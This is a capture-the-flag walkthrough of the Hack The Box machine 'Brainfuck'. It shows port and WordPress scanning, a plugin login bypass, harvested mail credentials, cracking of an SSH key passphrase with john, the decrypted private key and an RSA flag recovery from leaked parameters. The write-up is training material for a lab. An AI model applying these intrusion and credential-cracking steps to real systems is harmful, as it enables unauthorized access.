# Brainfuck
>Author : Xyan1d3
>Date : 22nd June 2021
>IP : 10.10.10.3
>OS : Linux
>Difficulty : Insane

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jun 22 11:20:16 2021 as: nmap -sC -sV -v -oN nmap/brainfuck 10.10.10.17
Nmap scan report for brainfuck.htb (10.10.10.17)
Host is up (0.087s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES TOP UIDL PIPELINING AUTH-RESP-CODE USER SASL(PLAIN)
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: IDLE have capabilities IMAP4rev1 Pre-login LOGIN-REFERRALS LITERAL+ more ID listed SASL-IR OK AUTH=PLAINA0001 ENABLE post-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-13T11:19:29
| Not valid after:  2027-04-11T11:19:29
| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
|_SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see in the SSH Fingerprint that it is running `OpenSSH 7.2p2 4ubuntu2.1` which we can do a lookup on lauchpad and find out that it is user by Ubuntu Xenial
Source : https://launchpad.net/ubuntu/xenial/amd64/openssh-sftp-server/1:7.2p2-4ubuntu2.1
![[Pasted image 20210622122613.png]]

We have port 443 open which is `https` and the SSL Certificate leaks some domain names of this box which we could add to our `/etc/hosts` file.

We add this line to our `/etc/hosts`.
```
10.10.10.17		brainfuck.htb 	sup3rs3cr3t.brainfuck.htb
```

## Web Enumeration (port 443)
Looking at the SSL Certificate we find out that we have a email address of the box.
![[Pasted image 20210622123224.png]]

Email : `orestis@brainfuck.htb`

We now visit the site and find out that the site is running wordpress.
![[Pasted image 20210622123721.png]]

### Wpscan
```python
[+] wp-support-plus-responsive-ticket-system     
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
 |      - https://www.exploit-db.com/exploits/40939/
 |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
 |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
```

I use wapalyzer plugin in my firefox browser to find about any backend technologies running.

We have a `WP Support Plus Responsive Ticket System` plugin installed into wordpress which has many vulnerabilities.

We do a quick searchsploit and find out that this plugin has a `privilege escalation`
vulnerability which is wrongly mentioned as it is actually a `Login bypass`.
Source : https://www.exploit-db.com/exploits/41006
![[Pasted image 20210622153154.png]]
This exploit abuses the incorrect uses of the `wp_set_auth_cookie()` function.

In this Exploit we need to change the username and the url and point it onto our `https://brainfuck.htb` and host the exploit as an html file and click Login, Which will redirect us onto the `https://brainfuck.htb` and will login as the user `admin`.

**The modified Exploit looks like it : **
![[Pasted image 20210622154426.png]]

We would now host it using the python3 `http.server` and then, visit our site and hit Login.
![[Pasted image 20210622154626.png]]

On, Clicking login we get redirected to the `https://brainfuck.htb/wp-admin/admin-ajax.php` which sets our cookie and after which on navigating to the wordpress site we see that we get to login as the admin user.
![[Pasted image 20210622155219.png]]

We could tamper the wordpress theme and put a PHP reverse shell which would be executed to get a reverse shell.
But, The Wordpress themes directory is readonly.
![[Pasted image 20210622155750.png]]

### Enumerating Wordpress Plugins
We could now try to look at the wordpress plugins and find out that the `Easy WP SMTP` plugin settings.
![[Pasted image 20210622160435.png]]

We get a username and password of the SMTP Server.
![[Pasted image 20210622160553.png]]

We could now, try this credentials to SSH into the box.
But, We get SSH denied into the box as the box only accepts key based authentication.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # ssh orestis@brainfuck
The authenticity of host 'brainfuck (10.10.10.17)' can't be established.
ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brainfuck' (ECDSA) to the list of known hosts.
orestis@brainfuck: Permission denied (publickey).
```
## SMTP Enumeration
We could try to login to the mail account using some email client like `Evolution`.
Now, We login to the email account and now check the emails.
![[Pasted image 20210622162304.png]]
## Web Enumeration `sup3rs3cr3t.brainfuck.htb`
We have a page which looks like a forum page which has a login and a signup button.
![[Pasted image 20210622161305.png]]
We could try out the credentials found from the email Inbox of `orestis@brainfuck.htb`.

We successfully get logged into the `orestis` account on the `sup3rs3cr3t.brainfuck.htb`.
Here, We see three forum threads. Of which the last one is useless as it has nothing intersting.
![[Pasted image 20210622162746.png]]

We check the SSH Access thread which states that the admin has disabled the password login into the SSH server.

![[Pasted image 20210622163141.png]]
![[Pasted image 20210622163158.png]]

Now, We could check another thread on the forums page. But, As stated by orestis that the chat channel is encrypted.
![[Pasted image 20210622163417.png]]
But, On Inspecting very carefully we see that the line `Orestis - Hacking for fun and profit` is similar to `Pieagnm - Jkoijeg nbw zwx mle grwsnn` in encypted.

It looks to me as Viginere Cipher which is a key-based encryption.
We could easily attack it by using an One-Time Pad.
Source : https://www.braingle.com/brainteasers/codes/onetimepad.php
![[Pasted image 20210622171419.png]]

We find out that the key is `fuckmybrain`.

We have to use the key to decrypt the using vigenere decode.
Source : https://cryptii.com/pipes/vigenere-cipher
![[Pasted image 20210622171854.png]]

We get a link : https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

Now, We download the SSH private Key.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # wget --no-check-certificate https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
--2021-06-22 19:44:18--  https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
Connecting to 10.10.10.17:443... connected.
WARNING: The certificate of ‘10.10.10.17’ is not trusted.
WARNING: The certificate of ‘10.10.10.17’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘10.10.10.17’
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa                                     100%[=====================================================================================>]   1.72K  --.-KB/s    in 0s      

2021-06-22 19:44:18 (23.5 MB/s) - ‘id_rsa’ saved [1766/1766]
```

The SSH Private key is encrypted. So, We need to decrypt the credentials.
```python
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```
We convert the encrypted SSH Private Key into SSH Hash and then, use JTR to crack the Hash.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # ssh2john.py id_rsa > ssh_hash
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # john ssh_hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
1g 0:00:00:10 DONE (2021-06-22 19:51) 0.09407g/s 1349Kp/s 1349Kc/s 1349KC/sa6_123..*7¡Vamos!
Session completed
```

SSH private key passphrase : `3poulakia!`

We could now, decode the SSH key and remove the passphrase from the SSH private key once and for all.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # openssl rsa -in id_rsa 
Enter pass phrase for id_rsa:
writing RSA key
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEA1R0frAsppJU+oKFLBRTZA/rB2mGTdt0VWN4g+wdnf6uWX3Pe
jjZMtlqFasbT8F9kLB2AZMXYFhnNDVKoNZlO844sMTcTVL7oZeflsl+1qPZM1jX8
0uvajR37Ap+QDdBpLazZrPbbG7Afz9TyA3VQ8YFMyKGGtnsqVDqxKnNeqHHK5ICh
PmZr4MaFNvZNvGfILqnP48Whfq9TaylDiYJlapOxtGyiZ3rHpt8ioCrZ3wvWGObH
fsAE0VoD4SjjlFl5bcJDC1OnAFw9b7Ok0MWpkdam6XNlx3mlWjU3dRLTPY7tbUK4
381VTK1vhZd96mhP1glxM0f9V3E/a+mF0ohtGQIDAQABAoIBAQCKx9p2ORa3PRF5
nU+zUW45bzSKN/zF7RcXth+YGaxGscDNDDGkPqwaHDzB2hTuddBQAi44cbZUPh0Q
TgGIVfvaE32n1wvZpjDFHAyy6izsiOhknuezmy/JsfpiLPKsbEnyGpvuTRtGnp04
xJ2Nrvo1K1SLWtTVRMO98jKpSFQeMDsx8vV6waonYxepEwzdBEhfYL/uU2719cMv
WNWWPfPeoymGkse0bdybPYUUNRGMaQBbO2F/OjpdMRB9WGKK1tvPR7b7yIB/i3AQ
Gme5RR7OKsxQDQCMrHlhEoZivFn/e9PuhtlXhYs/RTo0Ro4NZxo7z2WfD8Z0EvA7
tPwfDo75AoGBAPvcVVZQq/ZWeOdPZcOYhzm63eLo8698RelVtjW6kb5SjA5MgXr8
9biprb7NA0ubIRBMGhxsnD5PD8B17gkjeWZpFUWC6yI7QSPyzccSuyZvmSJqwih7
Y1G+cLzTrieCmGNLPnAo4Rq1aaAP7goN7F3EFN6lMHab74t/JhoeQ2oHAoGBANid
xLkuWSvo1KJ5bfona937MqiXaxbFc53nQvcRZKYz2zN9Pz/9hPHCGIrpfd/PjoM3
XmayhtwL9PrcFCPm7XJkYI6dAogzZJgqPLArHGxLzLVprZOqCkT8sLk45YYxewkw
Yl0klJBEaXvI6k4t9afK2jsbhqTJDgDz2J7AGCffAoGBAN47HSVrS0CyLj5TpYR/
+pmq1Axa5mJqcjmgAoXIGL9pkOExCnLd72dAeOlJdmXo/LSnocaA4yBrnIeCx0VT
AtSlVjqeeSEcTa8NmBrW4UHZ6LIgpy8XKJzBQDKtSRbdud6rTu2idHWfqxKr26sN
fAmEcbG+6lNN5oEc8R7Mo0lTAoGBAJ6lPbTaSxirlz+/a1pwkMGs/fcXnqi4x+p3
u0W0CWDoTbwyGKbHCBz/qHXkd/n4y0kyvgK88aQrZapskJuSv4iuF0GboIUcDqqb
FIN5r4FpKm4bDbM+L/NCljOxhfh4OMIMG55X8i6OzCqKhX/ojSfsm1P63uvFDGqK
LLZnvclFAoGBALkbrPESM99oXj9ftFsZlp+dxA5uQRLlbvcoT5asXhP/txqvyUge
30Qf8phocjJk469KC5wqQitPyQktM6XPFV/K7TNUzVFnG8rBt/mJgqUzyLgmera2
XyArHJLhZowzP3sJ9u3DzML/56oNLelLqB1K/Jcd+OqLQtj6zlkrOL2H
-----END RSA PRIVATE KEY-----
```

# Initial FootHold as orestis
We use the decoded SSH private Key and save into the file named `orestis.pem` and set correct permission and use the key to SSH into the box as orestis.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # chmod 600 orestis.pem 
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # ssh -i orestis.pem orestis@brainfuck
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Tue Jun 22 17:28:41 2021 from 10.10.14.3
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

**We can now grab our user.txt**
![[Pasted image 20210622200758.png]]

# Root Escalation
On doing `id` we find out that we are in the `lxd` group which is for using the `lxc`.
![[Pasted image 20210622201757.png]]
`lxc` is a containerization platform just like `Docker`. This group is a way for privilege escalation. It can be easily exploited by uploading a `alpine` linux image to the box and creating a container by mounting the `/` of the host machine onto some directory inside the container.
**The LXC route is an uninteded route.**

On looking at the home directory of the user `orestis` we find out that we have a 3 files called `encrypt.sage`, `output.txt` and `debug.txt`.

The `encrypt.sage` implements an RSA encryption.
```python
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```
The `output.txt` consists the encrypted output probably the flag.
```python
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```
We have a `debug.txt` which consists of `p`,`q`,`e`.
```python
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

On looking on web for `p`,`q`,`e` and decrypt `cipher` using the script.
Source : https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e
```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )
    print(f"Flag :{bytes.fromhex(hex(pt)[2:]).decode()}")
if __name__ == "__main__":
    main()
```

We run the script and get our `root.txt`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/brainfuck]
└──╼ # python3 rsa_decrypt.py 
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
Flag :6efc1a5dbb8904751ce6566a305bb8ef
```

# Credentials
|Username|Password|Found From|
|--|--|--|
|orestis|kHGuERB29DNiNE|Wordpress Easy WP SMTP plugin|
|orestis|kIEnnfEKJ#9UmdO|From the Email Inbox of the `orestis@brainfuck.htb`|
|SSH Private Key passphrase|3poulakia!|SSH private key by decoding the Vigenere encoded url from the forum page.